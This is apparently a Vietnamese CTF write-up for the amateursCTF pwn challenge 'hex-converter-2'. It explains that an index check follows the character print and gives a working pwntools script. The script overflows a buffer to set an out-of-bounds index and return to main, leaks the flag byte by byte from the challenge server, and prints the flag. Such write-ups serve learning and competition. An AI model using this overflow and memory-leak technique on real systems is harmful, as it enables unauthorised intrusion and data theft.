# HEX-CONVERTER-2

## Overview

![img](/amateursCTF/Pwn/hex-converter-2/assets/overview.png)

- Bài cũng cho chúng ta 3 file, giống như [hex-converter](/amateursCTF/Pwn/hex-converter/README.md).

- Source code bên trong cũng na ná. Chỉ khác là giờ ở trong vòng while có kiểm tra `i < 0`, nhưng đây không phải cách giải quyết tốt :skull:
</br>![img](/amateursCTF/Pwn/hex-converter-2/assets/source.png)

## Idea

- Do trước khi kiểm tra `i < 0` để kết thúc hàm chương trình vẫn in ra kí tự thứ i, nên cách đơn giản nhất là mình cho chạy vòng lặp i chạy từ `0 -> 63` mở kết nối đến server, gửi payload lấy kí tự thứ name[-64 + i] rồi cộng dồn vào biến s nào đó. Sau đó in ra là có flag.

## Script

```python
from pwn import *


addr = 0xffffffc0
main_addr = 0x401186
s = ""

for i in range(64):
    p = remote("amt.rs", 31631)
    p.recvline()
    payload = b"a"*0x1c + p32(addr+i) + b"a"*8 + p64(main_addr)
    p.sendline(payload)
    s += p.recvline().strip().decode()

flag = bytes.fromhex(s)
print(flag.decode("ASCII"))
```

## Result

![img](/amateursCTF/Pwn/hex-converter-2/assets/flag.png)

>### Flag: amateursCTF{an0ther_e4sier_0ne_t0_offset_unvariant_while_l00p}